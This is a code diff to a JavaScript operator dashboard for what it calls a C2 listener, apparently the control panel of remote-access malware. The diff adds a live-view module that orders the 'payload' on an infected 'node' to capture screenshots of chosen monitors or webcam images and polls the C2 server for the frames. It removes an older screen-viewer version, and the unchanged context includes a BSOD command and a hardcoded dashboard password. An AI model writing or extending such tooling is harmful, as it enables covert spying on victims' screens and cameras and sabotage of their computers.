@@ -13,7 +13,11 @@ const DASHBOARD_PASSWORD = "ducky_admin_2024";
 let activeNodeId = null; 
 let globalData = [];
 let allNodes = []; 
-let screenInterval = null;
+
+// --- NEW: Live View State ---
+let streamInterval = null;
+let activeStream = { type: null, monitor: 0 };
+const STREAM_POLL_RATE = 3000; // Poll every 3 seconds
 
 // ==========================================
 // INITIALIZATION
@@ -145,6 +149,97 @@ window.triggerBSOD = function() {
         sendCommandToNode(activeNodeId, "BSOD");
     } else { showToast("BSOD command aborted.", "error"); }
 };
+
+// ==========================================
+// LIVE VIEW STREAMING (NEW)
+// ==========================================
+window.startStream = async function(type, monitorIndex = 0) {
+    if (!activeNodeId) return showToast("No active node selected!", "error");
+    if (streamInterval) stopStream(); // Stop any existing stream
+
+    activeStream.type = type;
+    activeStream.monitor = monitorIndex;
+
+    const modal = document.getElementById('liveViewModal');
+    const title = document.getElementById('liveViewTitle');
+    const monitorControls = document.getElementById('monitorControls');
+    const imageEl = document.getElementById('liveViewImage');
+    const spinner = document.getElementById('liveViewSpinner');
+    
+    spinner.style.display = 'block';
+    imageEl.src = "";
+    imageEl.style.display = 'none';
+
+    modal.classList.remove('hidden');
+    setTimeout(() => modal.classList.add('visible'), 10);
+
+    if (type === 'screen') {
+        title.innerHTML = `<i class="fa-solid fa-desktop text-cyberBlue mr-3"></i>Remote Screen: <span class="font-mono">${activeNodeId}</span>`;
+        monitorControls.innerHTML = `
+            <button onclick="startStream('screen', 0)" class="px-3 py-1 text-xs rounded ${monitorIndex === 0 ? 'bg-cyberBlue text-dark font-bold' : 'bg-gray-700 text-gray-300'}">Monitor 1</button>
+            <button onclick="startStream('screen', 1)" class="px-3 py-1 text-xs rounded ${monitorIndex === 1 ? 'bg-cyberBlue text-dark font-bold' : 'bg-gray-700 text-gray-300'}">Monitor 2</button>
+        `;
+        monitorControls.classList.remove('hidden');
+    } else {
+        title.innerHTML = `<i class="fa-solid fa-camera text-cyberBlue mr-3"></i>Webcam Feed: <span class="font-mono">${activeNodeId}</span>`;
+        monitorControls.classList.add('hidden');
+    }
+
+    termLog(`Initializing ${type} stream on monitor ${monitorIndex}...`);
+    streamInterval = setInterval(fetchFrame, STREAM_POLL_RATE);
+    fetchFrame(); // Fetch immediately
+};
+
+async function fetchFrame() {
+    if (!activeNodeId) return stopStream();
+
+    // 1. Request a new frame from the payload
+    const command = activeStream.type === 'screen' 
+        ? `SCREENSHOT_MONITOR_${activeStream.monitor}` 
+        : 'WEBCAM_SHOT';
+    await sendCommandToNode(activeNodeId, command);
+
+    // 2. Poll the server for the frame posted by the payload
+    const cacheKey = activeStream.type === 'screen' 
+        ? `screen_${activeStream.monitor}` 
+        : 'webcam';
+    
+    try {
+        const response = await fetch(`${C2_LISTENER_URL}/frames/${activeNodeId}/${cacheKey}`, {
+            headers: { 'X-Dashboard-Password': DASHBOARD_PASSWORD }
+        });
+        if (response.ok) {
+            const data = await response.json();
+            const imageEl = document.getElementById('liveViewImage');
+            imageEl.src = `data:image/jpeg;base64,${data.frame}`;
+            document.getElementById('liveViewSpinner').style.display = 'none';
+            imageEl.style.display = 'block';
+        }
+    } catch (e) {
+        // This is expected if the frame isn't ready yet, so we don't show an error
+        console.log("Frame not ready, will retry.");
+    }
+}
+
+window.stopStream = function() {
+    if (streamInterval) {
+        clearInterval(streamInterval);
+        streamInterval = null;
+    }
+    if (activeNodeId) {
+        sendCommandToNode(activeNodeId, "STOP_STREAM");
+        termLog(`Stream stopped for ${activeNodeId}.`);
+    }
+    activeStream.type = null;
+};
+
+window.closeLiveView = function() {
+    stopStream();
+    const modal = document.getElementById('liveViewModal');
+    modal.classList.remove('visible');
+    setTimeout(() => modal.classList.add('hidden'), 300);
+};
+
 
 // ==========================================
 // UI & TAB LOGIC
@@ -426,105 +521,6 @@ window.executeTermCommand = function(inputEl) {
         }
     }, 200);
     inputEl.value = '';
-};
-
-// ==========================================
-// LIVE CONTROL MODALS (Screen, Cam, etc.)
-// ==========================================
-window.openScreenViewer = function() {
-    if (!activeNodeId) return showToast("Must authenticate to node first.", "error");
-    const modal = document.getElementById('screenViewerModal');
-    document.getElementById('sv-active-node').innerText = activeNodeId;
-    modal.classList.remove('hidden');
-    setTimeout(() => modal.classList.add('visible'), 10);
-    termLog("Screen viewer initialized. Ready to start feed.");
-    // Reset state on open
-    document.getElementById('screenViewerImage').classList.add('hidden');
-    document.getElementById('screenViewerImage').src = '';
-    document.getElementById('sv-placeholder').classList.remove('hidden');
-    document.getElementById('sv-status').innerText = 'STATUS: IDLE';
-    document.getElementById('sv-status').className = 'text-xs font-mono text-gray-500 ml-4';
-};
-
-window.closeScreenViewer = function() {
-    stopScreenFeed(); // Ensure feed is stopped on close
-    const modal = document.getElementById('screenViewerModal');
-    modal.classList.remove('visible');
-    setTimeout(() => modal.classList.add('hidden'), 300);
-};
-
-window.startScreenFeed = function() {
-    if (!activeNodeId) return;
-    if (screenInterval) clearInterval(screenInterval); // Clear any existing interval
-
-    const monitorIndex = document.getElementById('sv-monitor-select').value;
-    const command = `START_SCREENSHARE_${monitorIndex}`;
-    
-    sendCommandToNode(activeNodeId, command);
-    
-    screenInterval = setInterval(fetchScreenFrame, 1500); // Poll every 1.5s for a new frame
-    
-    const statusEl = document.getElementById('sv-status');
-    statusEl.innerText = 'STATUS: CONNECTING...';
-    statusEl.className = 'text-xs font-mono text-yellow-500 ml-4 animate-pulse';
-    showToast(`Starting screen feed for Monitor ${parseInt(monitorIndex) + 1}...`, "success");
-    termLog(`Command sent: ${command}`);
-};
-
-window.stopScreenFeed = function() {
-    if (screenInterval) {
-        clearInterval(screenInterval);
-        screenInterval = null;
-    }
-    if (activeNodeId) {
-        sendCommandToNode(activeNodeId, 'STOP_SCREENSHARE');
-    }
-    const statusEl = document.getElementById('sv-status');
-    statusEl.innerText = 'STATUS: STOPPED';
-    statusEl.className = 'text-xs font-mono text-red-500 ml-4';
-    termLog('Screen feed stopped.');
-};
-
-async function fetchScreenFrame() {
-    if (!activeNodeId) {
-        stopScreenFeed();
-        return;
-    }
-    try {
-        const response = await fetch(`${C2_LISTENER_URL}/screen/${activeNodeId}`, {
-            headers: { 'X-Dashboard-Password': DASHBOARD_PASSWORD }
-        });
-        if (!response.ok) throw new Error(`Server error: ${response.status}`);
-        
-        const data = await response.json();
-        const imgEl = document.getElementById('screenViewerImage');
-        const placeholderEl = document.getElementById('sv-placeholder');
-        const statusEl = document.getElementById('sv-status');
-
-        if (data.frame) {
-            imgEl.src = `data:image/jpeg;base64,${data.frame}`;
-            imgEl.classList.remove('hidden');
-            placeholderEl.classList.add('hidden');
-            statusEl.innerText = 'STATUS: LIVE';
-            statusEl.className = 'text-xs font-mono text-green-500 ml-4 animate-pulse';
-        } else if (statusEl.innerText.includes('LIVE')) {
-            statusEl.innerText = 'STATUS: INTERRUPTED';
-            statusEl.className = 'text-xs font-mono text-yellow-500 ml-4';
-        }
-    } catch (error) {
-        console.error("Error fetching screen frame:", error);
-        stopScreenFeed();
-        showToast("Screen feed failed or was interrupted.", "error");
-        const statusEl = document.getElementById('sv-status');
-        statusEl.innerText = 'STATUS: FAILED';
-        statusEl.className = 'text-xs font-mono text-red-500 ml-4';
-    }
-}
-
-window.openCamViewer = function() {
-    if (!activeNodeId) return showToast("Must authenticate to node first.", "error");
-    showToast("Live Cam module not yet implemented.", "error");
-    termLog("Live Cam module is in development. Awaiting payload integration.");
 };
 
 // ==========================================
